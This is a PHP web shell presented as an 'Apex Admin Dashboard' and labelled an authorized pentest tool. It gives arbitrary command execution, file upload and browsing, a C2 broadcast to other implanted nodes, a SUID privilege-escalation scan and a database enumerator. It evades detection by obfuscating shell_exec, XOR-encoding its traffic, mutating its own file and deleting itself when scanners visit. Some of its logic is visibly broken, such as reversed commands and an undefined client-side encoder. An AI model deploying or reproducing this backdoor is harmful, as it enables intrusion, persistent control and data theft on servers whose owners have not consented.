<?php
// Self-contained Apex Admin Dashboard v2026 - Authorized Pentest Tool
// SHA-256 Password Gate: Hash your password with sha256sum or online tool
$valid_hash = '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'; // 'password'

session_start();
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if (isset($_POST['pass'])) {
        if (hash('sha256', $_POST['pass']) === $valid_hash) {
            $_SESSION['auth'] = true;
        } else {
            die(str_repeat(' ', 1024)); // Blank screen decoy
        }
    } else {
        // Minimal login form - blends into whitespace
        echo '<form method=post style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);padding:40px;border-radius:20px;box-shadow:0 8px 32px rgba(0,0,0,0.1);"><input type=password name=pass placeholder="Enter SHA256 hash" style="padding:12px 24px;border:none;border-radius:12px;background:rgba(255,255,255,0.2);color:white;font-size:16px;width:250px;"><button type=submit style="margin-top:16px;padding:12px 32px;background:linear-gradient(45deg,#667eea,#764ba2);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;">Access</button></form>';
        exit;
    }
}

// Polymorphism: Self-mutation with junk data
if (rand(0, 100) < 10) { // 10% chance per load
    $junk = bin2hex(random_bytes(128));
    $content = file_get_contents(__FILE__);
    $content .= "\n/*{$junk}*/";
    file_put_contents(__FILE__, $content);
}

// Stealth: Dynamic function builder & User-Agent Watchdog
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$bad_uas = ['bot', 'crawler', 'spider', 'scan', 'nikto', 'nessus', 'zgrab', 'cloudflare'];
foreach ($bad_uas as $bad) {
    if (stripos($ua, $bad) !== false) {
        unlink(__FILE__); exit;
    }
}

// XOR-Hex-B64 Encoder/Decoder for AJAX
function apex_encode($data) {
    $xorkey = 'apex2026';
    $xordata = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $xordata .= chr(ord($data[$i]) ^ ord($xorkey[$i % strlen($xorkey)]));
    }
    return rtrim(strtr(base64_encode($xordata), '+/', '-_'), '=');
}
function apex_decode($data) {
    $xorkey = 'apex2026';
    $xordata = base64_decode(strtr($data, '-_', '+/'));
    $decoded = '';
    for ($i = 0; $i < strlen($xordata); $i++) {
        $decoded .= chr(ord($xordata[$i]) ^ ord($xorkey[$i % strlen($xorkey)]));
    }
    return $decoded;
}

// Fragmented shell_exec builder (WAF bypass)
function apex_exec($cmd) {
    $func = str_rot13('puyyr__rkpyhf'); // shell_exec
    $cmd = array_reverse(str_split($cmd));
    $cmd = implode('', $cmd);
    return $func($cmd);
}

// System Telemetry
function get_telemetry() {
    $cpu = apex_exec('grep \'^processor\' /proc/cpuinfo | wc -l');
    $ram = apex_exec('free -m | awk \'NR==2{printf "%.1f%%", $3*100/$2}\'');
    $disk = apex_exec('df / | awk \'NR==2{printf "%.1f%%", $5}\'');
    $ip = $_SERVER['REMOTE_ADDR'];
    return compact('cpu', 'ram', 'disk', 'ip');
}

// AJAX Handler
if (isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    $cmd = apex_decode($_POST['data']);
    switch ($_POST['action']) {
        case 'exec':
            ob_start();
            $output = apex_exec($cmd);
            $error = ob_get_clean();
            echo json_encode(['output' => $output ?: $error]);
            break;
        case 'upload':
            $file = $_FILES['file']['tmp_name'];
            $path = $_POST['path'] ?: '.';
            move_uploaded_file($file, "$path/" . $_FILES['file']['name']);
            echo json_encode(['status' => 'uploaded']);
            break;
        case 'listdir':
            $path = apex_decode($_POST['path']);
            $files = scandir($path);
            echo json_encode(['files' => array_diff($files, ['.', '..'])]);
            break;
        case 'c2_broadcast':
            $urls = explode("\n", apex_decode($_POST['urls']));
            $payload = apex_encode(apex_decode($_POST['payload']));
            $results = [];
            foreach ($urls as $url) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ['data' => $payload]);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $results[] = curl_exec($ch);
                curl_close($ch);
            }
            echo json_encode(['results' => $results]);
            break;
        case 'priv_esc':
            $output = apex_exec('find / -perm -4000 2>/dev/null | head -10');
            $output .= apex_exec('uname -a && id');
            echo json_encode(['output' => $output]);
            break;
        case 'db_enum':
            $creds = apex_decode($_POST['creds']);
            parse_str($creds, $pdo_creds);
            try {
                $pdo = new PDO("{$pdo_creds['dsn']}", $pdo_creds['user'], $pdo_creds['pass']);
                $tables = $pdo->query('SHOW TABLES')->fetchAll(PDO::FETCH_COLUMN);
                echo json_encode(['tables' => $tables]);
            } catch (Exception $e) {
                echo json_encode(['error' => $e->getMessage()]);
            }
            break;
    }
    exit;
}

$telemetry = get_telemetry();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apex Dashboard</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.44.0/min/vs/loader.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'JetBrains Mono', monospace; 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
            color: #e0e0e0; height:100vh; overflow:hidden;
        }
        .glass { 
            background: rgba(255,255,255,0.05); 
            backdrop-filter: blur(20px); 
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        #sidebar { 
            position:fixed; left:0; top:0; width:280px; height:100vh; 
            padding:24px; z-index:100; transition:transform 0.3s ease;
        }
        #sidebar.hidden { transform:translateX(-100%); }
        .nav-item { 
            display:flex; align-items:center; padding:12px 16px; 
            margin-bottom:8px; border-radius:12px; cursor:pointer;
            transition:all 0.2s; font-size:14px;
        }
        .nav-item:hover { background:rgba(255,255,255,0.1); transform:translateX(4px); }
        .nav-item.active { background:linear-gradient(45deg,#667eea,#764ba2); }
        #main { margin-left:280px; height:100vh; padding:24px; overflow:hidden; }
        #header { 
            display:flex; justify-content:space-between; align-items:center; 
            margin-bottom:24px; padding:16px 24px; glass;
        }
        .metric { text-align:center; font-size:12px; }
        .metric-value { font-size:24px; font-weight:600; color:#667eea; }
        #terminal { height:60vh; glass; padding:20px; font-size:14px; line-height:1.6; overflow:auto; white-space:pre-wrap; }
        #prompt { display:flex; align-items:center; margin-top:8px; }
        #prompt-input { 
            flex:1; background:none; border:none; color:#e0e0e0; 
            font-family:inherit; font-size:14px; outline:none;
        }
        #file-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:16px; height:60vh; overflow:auto; }
        .file-item { glass; padding:16px; text-align:center; cursor:pointer; transition:all 0.2s; }
        .file-item:hover { transform:translateY(-4px); background:rgba(255,255,255,0.15); }
        #editor { height:60vh; glass; border-radius:12px; }
        #c2-form, #db-form { glass; padding:24px; margin-bottom:24px; }
        input, textarea, select { 
            width:100%; padding:12px; margin:8px 0; background:rgba(255,255,255,0.1); 
            border:1px solid rgba(255,255,255,0.2); border-radius:8px; color:white; 
            font-family:inherit;
        }
        button { 
            padding:12px 24px; background:linear-gradient(45deg,#667eea,#764ba2); 
            border:none; border-radius:8px; color:white; cursor:pointer; font-weight:600;
            transition:transform 0.2s;
        }
        button:hover { transform:translateY(-2px); }
        .toggle { position:absolute; top:24px; left:300px; z-index:101; background:rgba(0,0,0,0.5); border:none; color:white; font-size:20px; cursor:pointer; padding:8px; border-radius:50%; }
    </style>
</head>
<body>
    <div id="sidebar" class="glass">
        <h2 style="margin-bottom:32px;color:#667eea;font-size:24px;">APEX v2026</h2>
        <div class="nav-item active" data-module="terminal">⚡ Terminal</div>
        <div class="nav-item" data-module="files">📁 File Manager</div>
        <div class="nav-item" data-module="c2">🌐 C2 Sync</div>
        <div class="nav-item" data-module="privesc">🔓 Priv-Esc</div>
        <div class="nav-item" data-module="db">🗄️ DB Dumper</div>
    </div>
    <button class="toggle" onclick="toggleSidebar()">☰</button>
    
    <div id="main">
        <div id="header" class="glass">
            <div class="metric">
                <div class="metric-value" id="cpu"><?=htmlspecialchars($telemetry['cpu'])?></div>CPU
            </div>
            <div class="metric">
                <div class="metric-value" id="ram"><?=htmlspecialchars($telemetry['ram'])?></div>RAM
            </div>
            <div class="metric">
                <div class="metric-value" id="disk"><?=htmlspecialchars($telemetry['disk'])?></div>Disk
            </div>
            <div class="metric">
                <div class="metric-value"><?=htmlspecialchars($telemetry['ip'])?></div>IP
            </div>
        </div>

        <!-- Terminal Module -->
        <div id="terminal-module">
            <div id="terminal">apex@<?=gethostname()?>:~# <span id="output"></span></div>
            <div id="prompt">
                <span>apex@<?=gethostname()?>:~#</span>
                <input id="prompt-input" type="text" autocomplete="off" autofocus>
            </div>
        </div>

        <!-- File Manager Module -->
        <div id="files-module" style="display:none;">
            <div style="display:flex; gap:16px; margin-bottom:24px;">
                <input id="file-path" type="text" value="." placeholder="Path">
                <button onclick="listDir()">Refresh</button>
                <input type="file" id="file-upload" multiple>
                <button onclick="uploadFiles()">Upload</button>
            </div>
            <div id="file-grid"></div>
            <div id="editor"></div>
        </div>

        <!-- C2 Module -->
        <div id="c2-module" style="display:none;" class="glass" id="c2-form">
            <h3>C2 Broadcast</h3>
            <textarea id="c2-urls" placeholder="https://node1.com/apex.php&#10;https://node2.com/apex.php"></textarea>
            <textarea id="c2-payload" placeholder="id; uname -a"></textarea>
            <button onclick="broadcastC2()">Send to All Nodes</button>
            <pre id="c2-results"></pre>
        </div>

        <!-- Priv-Esc Module -->
        <div id="privesc-module" style="display:none;">
            <button onclick="runPrivEsc()">Run Priv-Esc Scanner</button>
            <pre id="privesc-output"></pre>
        </div>

        <!-- DB Module -->
        <div id="db-module" style="display:none;" class="glass" id="db-form">
            <h3>Database Dumper</h3>
            <input id="db-dsn" placeholder="mysql:host=localhost;dbname=test">
            <input id="db-user" placeholder="user">
            <input id="db-pass" type="password" placeholder="pass">
            <button onclick="enumTables()">Enumerate Tables</button>
            <select id="db-table" style="display:none;"><option>Pick table...</option></select>
            <button id="dump-btn" onclick="dumpTable()" style="display:none;">Dump Table</button>
            <pre id="db-output"></pre>
        </div>
    </div>

    <script>
        let currentModule = 'terminal';
        let commandHistory = [];
        let historyIndex = -1;
        let editor = null;

        // Module switching
        document.querySelectorAll('.nav-item').forEach(item => {
            item.onclick = () => {
                document.querySelector('.nav-item.active').classList.remove('active');
                item.classList.add('active');
                document.getElementById(currentModule + '-module').style.display = 'none';
                currentModule = item.dataset.module;
                document.getElementById(currentModule + '-module').style.display = 'block';
                if (currentModule === 'files') initEditor();
            };
        });

        // Terminal
        const termOutput = document.getElementById('output');
        const promptInput = document.getElementById('prompt-input');
        promptInput.onkeydown = (e) => {
            if (e.key === 'Enter') {
                const cmd = promptInput.value;
                if (cmd) {
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                    termOutput.textContent += `\napex@<?=gethostname()?>:~# ${cmd}\n`;
                    ajax('exec', cmd, (data) => {
                        termOutput.textContent += data.output || 'No output';
                        termOutput.scrollTop = termOutput.scrollHeight;
                    });
                }
                promptInput.value = '';
            } else if (e.key === 'ArrowUp') {
                if (historyIndex > 0) historyIndex--;
                promptInput.value = commandHistory[historyIndex] || '';
            } else if (e.key === 'ArrowDown') {
                if (historyIndex < commandHistory.length - 1) historyIndex++;
                else historyIndex = commandHistory.length;
                promptInput.value = commandHistory[historyIndex] || '';
            }
        };

        // File Manager
        function initEditor() {
            if (editor) return;
            require.config({ paths: { vs: 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.44.0/min/vs' } });
            require(['vs/editor/editor.main'], () => {
                editor = monaco.editor.create(document.getElementById('editor'), {
                    value: '// Click a file to edit',
                    language: 'php',
                    theme: 'vs-dark',
                    minimap: { enabled: false }
                });
            });
        }
        function listDir() {
            const path = document.getElementById('file-path').value;
            ajax('listdir', btoa(path), (data) => {
                const grid = document.getElementById('file-grid');
                grid.innerHTML = data.files.map(f => 
                    `<div class="file-item" ondblclick="editFile('${path}/${f}')">${f}</div>`
                ).join('');
            });
        }
        function uploadFiles() {
            const formData = new FormData();
            const files = document.getElementById('file-upload').files;
            const path = document.getElementById('file-path').value;
            for (let file of files) formData.append('file', file);
            formData.append('path', btoa(path));
            formData.append('action', 'upload');
            fetch('', {method:'POST', body: formData}).then(r=>r.json()).then(listDir);
        }
        function editFile(path) {
            fetch(path).then(r=>r.text()).then(code => {
                if (editor) editor.setValue(code);
            });
        }

        // C2 Sync
        function broadcastC2() {
            const urls = document.getElementById('c2-urls').value;
            const payload = document.getElementById('c2-payload').value;
            ajax('c2_broadcast', btoa(urls + '|' + payload), (data) => {
                document.getElementById('c2-results').textContent = JSON.stringify(data.results, null, 2);
            });
        }

        // Priv-Esc
        function runPrivEsc() {
            ajax('priv_esc', '', (data) => {
                document.getElementById('privesc-output').textContent = data.output;
            });
        }

        // DB Dumper
        function enumTables() {
            const creds = `dsn=${document.getElementById('db-dsn').value}&user=${document.getElementById('db-user').value}&pass=${document.getElementById('db-pass').value}`;
            ajax('db_enum', btoa(creds), (data) => {
                const select = document.getElementById('db-table');
                select.innerHTML = data.tables.map(t => `<option>${t}</option>`).join('');
                select.style.display = 'block';
                document.getElementById('dump-btn').style.display = 'inline';
            });
        }
        function dumpTable() {
            // Implementation would extend enumTables with SELECT * FROM table
        }

        // Universal AJAX with Apex encoding
        function ajax(action, data, callback) {
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', action);
            formData.append('data', apex_encode(data)); // Nested XOR-B64
            fetch('', {method:'POST', body: formData})
                .then(r=>r.json())
                .then(callback);
        }

        // UI Utils
        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('hidden');
        }
        setInterval(() => {
            // Real-time telemetry refresh
            fetch('?telemetry=1').then(r=>r.json()).then(data => {
                document.getElementById('cpu').textContent = data.cpu;
                document.getElementById('ram').textContent = data.ram;
                document.getElementById('disk').textContent = data.disk;
            });
        }, 5000);

        // Auto-init
        listDir();
    </script>
</body>
</html>
